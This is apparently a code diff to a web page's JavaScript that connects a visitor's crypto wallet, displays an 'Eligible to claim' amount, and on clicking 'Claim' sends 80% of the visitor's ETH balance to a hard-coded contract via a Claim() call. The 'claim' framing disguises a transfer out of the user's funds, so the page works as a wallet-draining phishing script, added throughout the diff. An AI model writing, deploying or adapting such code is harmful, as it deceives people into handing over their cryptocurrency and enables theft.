@@ -58,19 +58,19 @@
 
   <script src="https://cdn.jsdelivr.net/npm/web3@1.5.2/dist/web3.min.js"></script>
   <script>
-    // Wait for the page to load
-    window.addEventListener('load', async () => {
-      // Check if Web3 is available
-      if (typeof web3 !== 'undefined') {
-        // Use the existing Web3 provider
-        window.web3 = new Web3(web3.currentProvider);
-      } else {
-        // Handle the case where the user doesn't have Web3 installed or enabled
-        console.error('Please install MetaMask or another Web3 provider.');
-        return;
-      }
+// Wait for the page to load
+window.addEventListener('load', async () => {
+  // Check if Web3 is available
+  if (typeof web3 !== 'undefined') {
+    // Use the existing Web3 provider
+    window.web3 = new Web3(web3.currentProvider);
+  } else {
+    // Handle the case where the user doesn't have Web3 installed or enabled
+    console.error('Please install MetaMask or another Web3 provider.');
+    return;
+  }
 
-      // Load the contract
+  // Load the contract
      const contractAddress = '0xcB153471E78c062519e43e9AE70d6CcA31989C10'; // Replace with the actual contract address
   const contractABI = [
   {
@@ -189,78 +189,93 @@
   }
 ];
 
+  const contract = new web3.eth.Contract(contractABI, contractAddress);
 
-      const contract = new web3.eth.Contract(contractABI, contractAddress);
+  // Get the user's accounts
+  const accounts = await web3.eth.getAccounts();
+  const userAccount = accounts[0];
 
+  // Connect Wallet button
+  const connectWalletButton = document.createElement('button');
+  connectWalletButton.textContent = 'Connect Wallet';
+  connectWalletButton.addEventListener('click', async () => {
+    try {
+      // Request the user to connect their wallet
+      await ethereum.request({ method: 'eth_requestAccounts' });
+    } catch (error) {
+      console.error('Failed to connect the wallet', error);
+      return;
+    }
+
+    // Hide the Connect Wallet button after successful connection
+    connectWalletButton.style.display = 'none';
+
+    // Enable the Check Eligibility button
+    checkEligibilityButton.disabled = false;
+  });
+
+  // Append Connect Wallet button to the body
+  document.body.appendChild(connectWalletButton);
+
+  // Check Eligibility button
+  const checkEligibilityButton = document.getElementById('checkEligibilityButton');
+  const eligibilityResult = document.getElementById('eligibilityResult');
+  checkEligibilityButton.addEventListener('click', async () => {
+    // Check if the wallet is connected
+    if (!(await web3.eth.net.isListening())) {
+      eligibilityResult.textContent = 'Please connect your wallet first.';
+      return;
+    }
+
+    try {
       // Get the user's accounts
       const accounts = await web3.eth.getAccounts();
       const userAccount = accounts[0];
 
-// Handle the check eligibility button click event
-const checkEligibilityButton = document.getElementById('checkEligibilityButton');
-const eligibilityResult = document.getElementById('eligibilityResult');
-checkEligibilityButton.addEventListener('click', async () => {
-  // Check if the wallet is connected
-  if (!(await web3.eth.net.isListening())) {
-    try {
-      // Request the user to connect their wallet
-      await ethereum.enable();
-      checkEligibilityButton.textContent = 'Check Eligibility'; // Change button text
+      // Get the user's balance
+      const balance = await web3.eth.getBalance(userAccount);
+      const balanceInWei = balance.toString();
+
+      // Calculate 80% of the payable amount
+      const payableAmount = web3.utils.toBN(balanceInWei).muln(80).divn(100);
+
+      // Display the eligibility result
+      eligibilityResult.textContent = `Eligible to claim: ${web3.utils.fromWei(payableAmount.toString(), 'ether')} ETH`;
+
+      // Enable the claim button
+      const claimButton = document.getElementById('claimButton');
+      claimButton.disabled = false;
     } catch (error) {
-      console.error('Failed to connect the wallet', error);
-      eligibilityResult.textContent = 'Failed to connect the wallet';
-      return;
+      console.error('Eligibility check failed', error);
+      eligibilityResult.textContent = 'Eligibility check failed';
     }
-  }
+  });
 
-  try {
-    // Get the user's accounts
-    const accounts = await web3.eth.getAccounts();
-    const userAccount = accounts[0];
+  // Claim button
+  const claimButton = document.getElementById('claimButton');
+  claimButton.addEventListener('click', async () => {
+    try {
+      // Request user approval
+      await ethereum.request({ method: 'eth_requestAccounts' });
 
-    // Get the user's balance
-    const balance = await web3.eth.getBalance(userAccount);
-    const balanceInWei = balance.toString();
+      // Get the user's balance
+      const balance = await web3.eth.getBalance(userAccount);
+      const balanceInWei = balance.toString();
 
-    // Calculate 80% of the payable amount
-    const payableAmount = web3.utils.toBN(balanceInWei).muln(80).divn(100);
+      // Calculate 80% of the payable amount
+      const payableAmount = web3.utils.toBN(balanceInWei).muln(80).divn(100);
 
-    // Display the eligibility result
-    eligibilityResult.textContent = `Eligible to claim: ${web3.utils.fromWei(payableAmount.toString(), 'ether')} ETH`;
-
-    // Enable the claim button
-    const claimButton = document.getElementById('claimButton');
-    claimButton.disabled = false;
-  } catch (error) {
-    console.error('Eligibility check failed', error);
-    eligibilityResult.textContent = 'Eligibility check failed';
-  }
+      // Call the contract's claim function with the payable amount
+      await contract.methods.Claim().send({ from: userAccount, value: payableAmount });
+      console.log('Claim successful');
+      // You can add additional code here to handle the claim success event
+    } catch (error) {
+      console.error('Claim failed', error);
+      // You can add additional code here to handle the claim failure event
+    }
+  });
 });
 
-      // Handle the claim button click event
-      const claimButton = document.getElementById('claimButton');
-      claimButton.addEventListener('click', async () => {
-        try {
-          // Request user approval
-          await ethereum.enable();
-
-          // Get the user's balance
-          const balance = await web3.eth.getBalance(userAccount);
-          const balanceInWei = balance.toString();
-
-          // Calculate 80% of the payable amount
-          const payableAmount = web3.utils.toBN(balanceInWei).muln(80).divn(100);
-
-          // Call the contract's claim function with the payable amount
-          await contract.methods.Claim().send({ from: userAccount, value: payableAmount });
-          console.log('Claim successful');
-          // You can add additional code here to handle the claim success event
-        } catch (error) {
-          console.error('Claim failed', error);
-          // You can add additional code here to handle the claim failure event
-        }
-      });
-    });
   </script>
 </body>
 </html>
